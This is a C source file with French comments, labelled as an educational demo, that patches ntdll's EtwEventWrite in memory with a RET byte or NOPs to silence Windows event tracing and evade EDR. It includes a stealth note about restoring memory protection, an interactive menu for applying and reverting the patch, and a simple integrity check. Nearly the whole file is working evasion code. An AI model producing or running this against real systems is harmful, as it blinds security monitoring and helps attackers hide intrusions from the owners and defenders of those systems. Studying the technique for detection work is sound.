// EDUCATIONAL ONLY - ETW Patching Demo
// AVERTISSEMENT : Technique evasion EDR - Ne jamais utiliser malicieusement

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <windows.h>
#include <evntprov.h>
#pragma comment(lib, "advapi32.lib")

// Backup pour restauration
typedef struct {
    void* address;
    unsigned char original_bytes[16];
    size_t size;
    DWORD old_protect;
} PatchBackup;

// Obtenir adresse fonction dans ntdll
void* get_function_address(const char* module_name, const char* function_name) {
    HMODULE module = GetModuleHandleA(module_name);
    if (!module) {
        printf("[!] Failed to get module %s\n", module_name);
        return NULL;
    }

    void* func_addr = GetProcAddress(module, function_name);
    if (!func_addr) {
        printf("[!] Failed to get address of %s\n", function_name);
        return NULL;
    }

    printf("[+] %s!%s = 0x%p\n", module_name, function_name, func_addr);
    return func_addr;
}

// Modifier protection memoire
int change_memory_protection(void* address, size_t size, DWORD new_protect, DWORD* old_protect) {
    if (!VirtualProtect(address, size, new_protect, old_protect)) {
        printf("[!] VirtualProtect failed (error: %lu)\n", GetLastError());
        return -1;
    }
    return 0;
}

// Patch avec RET instruction
int patch_with_ret(void* address, PatchBackup* backup) {
    printf("\n[*] Patching with RET instruction...\n");

    backup->address = address;
    backup->size = 1;

    // Sauvegarder bytes originaux
    memcpy(backup->original_bytes, address, backup->size);
    printf("[+] Original byte: 0x%02X\n", backup->original_bytes[0]);

    // Modifier protection
    if (change_memory_protection(address, backup->size,
                                  PAGE_EXECUTE_READWRITE,
                                  &backup->old_protect) != 0) {
        return -1;
    }

    // Ecrire RET (0xC3)
    unsigned char ret_opcode = 0xC3;
    memcpy(address, &ret_opcode, 1);

    // Restaurer protection (optionnel - plus stealth)
    DWORD temp;
    VirtualProtect(address, backup->size, backup->old_protect, &temp);

    printf("[+] Patch applied successfully\n");
    return 0;
}

// Patch avec NOPs
int patch_with_nops(void* address, size_t size, PatchBackup* backup) {
    printf("\n[*] Patching with NOPs...\n");

    backup->address = address;
    backup->size = size;

    // Sauvegarder bytes originaux
    memcpy(backup->original_bytes, address, backup->size);
    printf("[+] Original bytes: ");
    for (size_t i = 0; i < backup->size; i++) {
        printf("%02X ", backup->original_bytes[i]);
    }
    printf("\n");

    // Modifier protection
    if (change_memory_protection(address, backup->size,
                                  PAGE_EXECUTE_READWRITE,
                                  &backup->old_protect) != 0) {
        return -1;
    }

    // Ecrire NOPs (0x90)
    memset(address, 0x90, size);

    // Restaurer protection
    DWORD temp;
    VirtualProtect(address, backup->size, backup->old_protect, &temp);

    printf("[+] Patch applied successfully\n");
    return 0;
}

// Restaurer bytes originaux
int restore_patch(PatchBackup* backup) {
    printf("\n[*] Restoring original bytes...\n");

    if (!backup->address) {
        printf("[!] No backup to restore\n");
        return -1;
    }

    DWORD old_protect;
    if (change_memory_protection(backup->address, backup->size,
                                  PAGE_EXECUTE_READWRITE,
                                  &old_protect) != 0) {
        return -1;
    }

    memcpy(backup->address, backup->original_bytes, backup->size);

    DWORD temp;
    VirtualProtect(backup->address, backup->size, old_protect, &temp);

    printf("[+] Original bytes restored\n");
    return 0;
}

// Tester emission events ETW
void test_etw_events(int should_work) {
    printf("\n[*] Testing ETW event emission...\n");

    REGHANDLE registration = 0;
    GUID provider_guid = {0x12345678, 0x1234, 0x1234,
                          {0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0}};

    // Enregistrer provider ETW
    ULONG result = EventRegister(&provider_guid, NULL, NULL, &registration);
    if (result != ERROR_SUCCESS) {
        printf("[!] EventRegister failed (error: %lu)\n", result);
        return;
    }

    printf("[+] ETW Provider registered\n");

    // Tenter emission event
    EVENT_DESCRIPTOR descriptor = {0};
    descriptor.Id = 1;
    descriptor.Version = 0;
    descriptor.Level = TRACE_LEVEL_INFORMATION;

    result = EventWrite(registration, &descriptor, 0, NULL);
    if (result == ERROR_SUCCESS) {
        printf("[%s] ETW event emitted successfully\n", should_work ? "+" : "!");
    } else {
        printf("[%s] ETW event emission failed (error: %lu)\n",
               should_work ? "!" : "+", result);
    }

    EventUnregister(registration);
}

// Verifier si ntdll est patche
int check_ntdll_integrity(void) {
    printf("\n[*] Checking ntdll.dll integrity...\n");

    void* etw_addr = get_function_address("ntdll.dll", "EtwEventWrite");
    if (!etw_addr) return -1;

    unsigned char* bytes = (unsigned char*)etw_addr;
    printf("[+] First 8 bytes: ");
    for (int i = 0; i < 8; i++) {
        printf("%02X ", bytes[i]);
    }
    printf("\n");

    // Check si RET immediat (patch simple)
    if (bytes[0] == 0xC3) {
        printf("[!] PATCHED: Function starts with RET\n");
        return 1;
    }

    // Check si NOPs excessifs
    int nop_count = 0;
    for (int i = 0; i < 8; i++) {
        if (bytes[i] == 0x90) nop_count++;
    }
    if (nop_count > 4) {
        printf("[!] PATCHED: Excessive NOPs detected\n");
        return 1;
    }

    printf("[+] No obvious patching detected\n");
    return 0;
}

int main(int argc, char* argv[]) {
    printf("========================================\n");
    printf("  ETW Patching Demo (Educational)\n");
    printf("========================================\n");
    printf("AVERTISSEMENT : Educational purpose only\n");
    printf("         EDR evasion technique\n\n");

    // Verifier integrite avant patch
    check_ntdll_integrity();

    // Tester ETW avant patch
    test_etw_events(1);

    // Obtenir adresse EtwEventWrite
    void* etw_addr = get_function_address("ntdll.dll", "EtwEventWrite");
    if (!etw_addr) {
        return 1;
    }

    PatchBackup backup = {0};

    // Menu interactif
    printf("\n========================================\n");
    printf("Options:\n");
    printf("  1. Patch with RET\n");
    printf("  2. Patch with NOPs\n");
    printf("  3. Restore original\n");
    printf("  4. Check integrity\n");
    printf("  5. Test ETW\n");
    printf("  0. Exit\n");
    printf("========================================\n");

    int choice;
    while (1) {
        printf("\nChoice: ");
        if (scanf("%d", &choice) != 1) {
            while (getchar() != '\n');
            continue;
        }

        switch (choice) {
            case 1:
                patch_with_ret(etw_addr, &backup);
                test_etw_events(0);
                break;
            case 2:
                patch_with_nops(etw_addr, 8, &backup);
                test_etw_events(0);
                break;
            case 3:
                restore_patch(&backup);
                test_etw_events(1);
                break;
            case 4:
                check_ntdll_integrity();
                break;
            case 5:
                test_etw_events(1);
                break;
            case 0:
                if (backup.address) {
                    printf("\n[*] Cleaning up...\n");
                    restore_patch(&backup);
                }
                printf("[*] Exiting\n");
                return 0;
            default:
                printf("[!] Invalid choice\n");
        }
    }

    return 0;
}

#else
// Non-Windows platform
int main(void) {
    printf("ETW patching is Windows-specific\n");
    printf("Compile on Windows with: cl example.c\n");
    return 1;
}
#endif
